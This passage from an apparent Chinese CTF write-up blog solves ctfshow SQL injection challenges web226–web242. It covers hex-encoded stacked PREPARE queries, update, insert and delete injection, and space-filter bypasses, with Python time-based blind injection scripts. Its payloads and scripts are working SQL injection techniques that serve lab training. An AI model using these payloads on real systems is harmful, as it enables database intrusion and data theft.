</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//师傅说过滤的越多越好
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#39;</span><span class="p">,</span><span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>这道题把show给waf掉了</p>
<p>这题可以用预处理来打</p>
<p>[<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%7B%22request%5Fid%22%3A%22160652999219721940215459%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=160652999219721940215459&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&amp;utm_term=%e5%bc%ba%e7%bd%91%e6%9d%af&amp;spm=1018.2118.3001.4450">SQL注入][强网杯 2019]随便注(三种姿势)-CSDN博客</a></p>
<p>格式</p>
<pre tabindex="0"><code>PREPARE name from &#39;[my sql sequece]&#39;;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
</code></pre><p>我们可以先将要执行的语句转换成16进制后，作为预处理的sql语句传入，并执行</p>
<p>payload</p>
<pre tabindex="0"><code>username=1&#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;
//show tables

username=1&#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;
//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfsh_ow_flagas&#39;

username=1&#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;
//select flagasb from ctfsh_ow_flagas
//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890}
</code></pre><h4 id="web227">web227<a hidden class="anchor" aria-hidden="true" href="#web227">#</a></h4>
<p>这道题没办法通过查表拿到flag</p>
<p>这道题的payload是</p>
<pre tabindex="0"><code>1&#39;;call getFlag();
</code></pre><p>就是执行getFlag函数拿到flag</p>
<p>但问题是我们要怎么知道这个函数呢</p>
<p>我们需要查看MySQL的存储过程，如下文</p>
<p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数_mysql 查询function-CSDN博客</a></p>
<p><img alt="image-20250216161746894" loading="lazy" src="../assets/image-20250216161746894.png"></p>
<pre tabindex="0"><code>SELECT * FROM information_schema.Routines
</code></pre><p>通过预处理执行</p>
<pre tabindex="0"><code>username=1&#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines;
</code></pre><p><img alt="image-20250216162150778" loading="lazy" src="../assets/image-20250216162150778.png"></p>
<p>可以看到getFlag函数和flag</p>
<h4 id="web228">web228<a hidden class="anchor" aria-hidden="true" href="#web228">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;select id,username,pass from ctfshow_user where username = &#39;{$username}&#39;;&#34;;
  $bansql = &#34;select char from banlist;&#34;;
      
返回逻辑

  //师傅说内容太多，就写入数据库保存
  if(count($banlist)&gt;0){
    foreach ($banlist as $char) {
      if(preg_match(&#34;/&#34;.$char.&#34;/i&#34;, $username)){
        die(json_encode($ret));
      }
    }
  }
</code></pre><p>同web226</p>
<h4 id="web229">web229<a hidden class="anchor" aria-hidden="true" href="#web229">#</a></h4>
<p>同web226</p>
<h4 id="web230">web230<a hidden class="anchor" aria-hidden="true" href="#web230">#</a></h4>
<p>同web226</p>
<h4 id="update注入">update注入<a hidden class="anchor" aria-hidden="true" href="#update注入">#</a></h4>
<p><img alt="image-20250217174244222" loading="lazy" src="../assets/image-20250217174244222.png"></p>
<h4 id="web231">web231<a hidden class="anchor" aria-hidden="true" href="#web231">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤

      
</code></pre><p>知道update函数的作用之后就好理解了</p>
<p>可以通过update函数更新ctfshow_user表中的内容</p>
<p>利用update将查询结果写入表中</p>
<pre tabindex="0"><code>password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
</code></pre><p><img alt="image-20250217180924812" loading="lazy" src="../assets/image-20250217180924812.png"></p>
<pre tabindex="0"><code>查表名
password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1
查列名
password=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;) where 1=1#&amp;username=1
得到flag
password=1&#39;,username=(select flagas from flaga) where 1=1#&amp;username=1
                      
原文链接：https://blog.csdn.net/solitudi/article/details/110144623
</code></pre><h4 id="web232">web232<a hidden class="anchor" aria-hidden="true" href="#web232">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = md5(&#39;{$password}&#39;) where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>同web231</p>
<pre tabindex="0"><code>password=1&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1

password=1&#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;) where 1=1#&amp;username=1

password=1&#39;),username=(select flagass from flagaa) where 1=1#&amp;username=1
</code></pre><h4 id="web233">web233<a hidden class="anchor" aria-hidden="true" href="#web233">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>这道题貌似waf掉了单引号，导致无法构造闭合，前面的方法用不了</p>
<h5 id="方法一">方法一<a hidden class="anchor" aria-hidden="true" href="#方法一">#</a></h5>
<p>wp看到的骚操作</p>
<p><img alt="image-20250217182218885" loading="lazy" src="../assets/image-20250217182218885.png"></p>
<p>payload</p>
<pre tabindex="0"><code>#获取表名
password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23

#获取列名
password=\&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23

#获取数据
password=\&amp;username=,username=(select group_concat(flagass233) from flag233333)
</code></pre><h5 id="方法二-盲注">方法二 ：盲注<a hidden class="anchor" aria-hidden="true" href="#方法二-盲注">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查数据库</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;flag233333&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="c1"># 查数据</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagass233 from flag233333&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1&#39; or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(0.05),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;4&#39;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.9</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web234">web234<a hidden class="anchor" aria-hidden="true" href="#web234">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = &#34;update ctfshow_user set pass = &#39;{$password}&#39; where username = &#39;{$username}&#39;;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>同web233，用\实现逃逸</p>
<h4 id="web235">web235<a hidden class="anchor" aria-hidden="true" href="#web235">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update ctfshow_user set pass = &#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39; where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤 or &#39; 
</span></span></span></code></pre></div><p><strong>or &lsquo;</strong> 被禁导致inf<strong>or</strong>mation_schema.tables也被禁了</p>
<p>导致我们没办法查询列</p>
<p>这种情况涉及到一个知识点 ：<a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入 - 知乎</a></p>
<blockquote>
<p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 <a href="https://zhida.zhihu.com/search?content_id=109954541&amp;content_type=Article&amp;match_order=1&amp;q=INNODB_COLUMNS&amp;zhida_source=entity">INNODB_COLUMNS</a> 中记录着表结构。</p></blockquote>
<p>读表</p>
<pre tabindex="0"><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\
</code></pre><p>查字段</p>
<pre tabindex="0"><code>username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\
</code></pre><h4 id="web236">web236<a hidden class="anchor" aria-hidden="true" href="#web236">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update ctfshow_user set pass = &#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39; where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤 or &#39; flag
</span></span></span></code></pre></div><p>读表</p>
<pre tabindex="0"><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\

//banlist,ctfshow_user,flaga
</code></pre><p>读字段</p>
<pre tabindex="0"><code>username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#&amp;password=\
</code></pre><p>这题新增的flag过滤，但是实际上没有影响，或许是过滤返回的内容？</p>
<h4 id="insert注入">insert注入<a hidden class="anchor" aria-hidden="true" href="#insert注入">#</a></h4>
<h4 id="web237">web237<a hidden class="anchor" aria-hidden="true" href="#web237">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//插入数据
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into ctfshow_user(username,pass) value(&#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span></code></pre></div><p>insert函数用于插入值</p>
<p>其实跟update注入差不多</p>
<p>payload:</p>
<p>读表名</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
</code></pre><p><img alt="image-20250218102751491" loading="lazy" src="../assets/image-20250218102751491.png"></p>
<p>查列名</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));#

//id,flagass23s3,info
</code></pre><p>爆字段</p>
<pre tabindex="0"><code>password=1&amp;username=1&#39;,(select flagass23s3 from flag));#
</code></pre><h4 id="web238">web238<a hidden class="anchor" aria-hidden="true" href="#web238">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//插入数据
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into ctfshow_user(username,pass) value(&#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$password</span><span class="si">}</span><span class="s2">&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤空格
</span></span></span></code></pre></div><p>测了一下发现不止是空格，连同一些代替空格的字符也被一同waf了，比如/**/</p>
<p>我们可以考虑<strong>用括号代替空格</strong></p>
<p>payload</p>
<pre tabindex="0"><code>#获取表名
username=1&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23&amp;password=1

#获取列名
username=1&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flagb&#39;)))%23&amp;password=1

#获取数据
username=1&#39;,(select(group_concat(flag))from(flagb)))%23&amp;password=1
</code></pre><h4 id="web239">web239<a hidden class="anchor" aria-hidden="true" href="#web239">#</a></h4>
<pre tabindex="0"><code>查询语句

  //插入数据
  $sql = &#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;;
      
返回逻辑

  //过滤空格 or 
</code></pre><p>payload:</p>
<p>读表</p>
<pre tabindex="0"><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1
</code></pre><p>由于*被ban掉了，没办法用之前无列名爆字段的方法</p>
<p>这里猜测列名为flag，直接读</p>
<pre tabindex="0"><code>username=1&#39;,(select(flag)from(flagbb)))#&amp;password=1
</code></pre><h4 id="web240">web240<a hidden class="anchor" aria-hidden="true" href="#web240">#</a></h4>
<pre tabindex="0"><code>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写
</code></pre><pre tabindex="0"><code>查询语句

  //插入数据
  $sql = &#34;insert into ctfshow_user(username,pass) value(&#39;{$username}&#39;,&#39;{$password}&#39;);&#34;;
      
返回逻辑

  //过滤空格 or sys mysql
</code></pre><p>根据hint可以知道是要爆破表名</p>
<p>拿y4✌的脚本改一下</p>
<pre tabindex="0"><code>&#34;&#34;&#34;
Author:Y4tacker
&#34;&#34;&#34;
import random
import requests

url = &#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show&#34;
url_insert = url + &#34;/api/insert.php&#34;
url_flag = url + &#34;/api/?page=1&amp;limit=1000&#34;


# 看命函数
def generate_random_str():
    sttr = &#39;ab&#39;
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = &#39;&#39;.join(str_list)
    return random_str


while 1:
    data = {
        &#39;username&#39;: f&#34;1&#39;,(select(flag)from(flag{generate_random_str()})))#&#34;,
        &#39;password&#39;: &#34;&#34;
    }
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if &#34;ctfshow{&#34; in r2.text:
        for i in r2.json()[&#39;data&#39;]:
            if  &#34;ctfshow{&#34; in i[&#39;pass&#39;]:
                print(i[&#39;pass&#39;])
                break
        break
</code></pre><h4 id="web241">web241<a hidden class="anchor" aria-hidden="true" href="#web241">#</a></h4>
<pre tabindex="0"><code>sql语句

  //删除记录
  $sql = &#34;delete from  ctfshow_user where id = {$id}&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>delete注入，delete函数顾名思义就是从数据库中删除内容</p>
<p>注入点在where后面，可以采用时间盲注或者布尔盲注，但是由于delete会删除数据库中的记录，所以可能会出现记录都删完了但是flag还没注出来的情况</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nb">min</span><span class="p">,</span><span class="nb">max</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">128</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="nb">min</span> <span class="o">+</span> <span class="p">(</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">min</span> <span class="o">==</span> <span class="n">j</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">            <span class="nb">str</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># 爆表名</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># payload = {</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1">#     &#39;id&#39;: f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.03),1)#&#39;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># }</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># 爆列</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = {</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1">#     &#39;id&#39;: f&#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),{i},1))&lt;{j},sleep(0.03),1)#&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># }</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># 爆值</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select group_concat(flag) from flag),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&lt;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,sleep(0.03),1)#&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">sub</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">if</span> <span class="n">sub</span> <span class="o">&gt;=</span> <span class="mf">0.2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="nb">max</span> <span class="o">=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="nb">min</span> <span class="o">=</span> <span class="n">j</span>
</span></span></code></pre></div><p>为什么sleep设定的是0.03，但是超时时间是大于0.2呢</p>
<p>那是因为要对所有记录都算一遍 if</p>
<p>那我们怎么测试这个时间呢，这里放一个大佬的脚本</p>
<p><a href="https://hextuff.dev/2021/07/29/ctfshow-web-getting-started-sql-injection/">Practice - CTFSHOW WEB入门 SQL注入篇</a></p>
<pre tabindex="0"><code>url = &#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php&#39;


def test2() -&gt; float:
    rand = random.random()
    time_s = time.time()
    _ = requests.post(url,data={&#34;id&#34;: f&#34;if({1 if rand &gt; 0.5 else 0},sleep(0.05),0)&#34;})
    time_e = time.time()
    return (rand &gt; 0.5, time_e - time_s)

print([test() for _ in range(30)])
</code></pre><p>我测出来的结果</p>
<pre tabindex="0"><code>[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)]
</code></pre><p>在false和true之间选取一个合适的值即可，目的是能够进行区分，我这里选取了0.2</p>
<h4 id="文件注入">文件注入<a hidden class="anchor" aria-hidden="true" href="#文件注入">#</a></h4>
<h4 id="web242">web242<a hidden class="anchor" aria-hidden="true" href="#web242">#</a></h4>
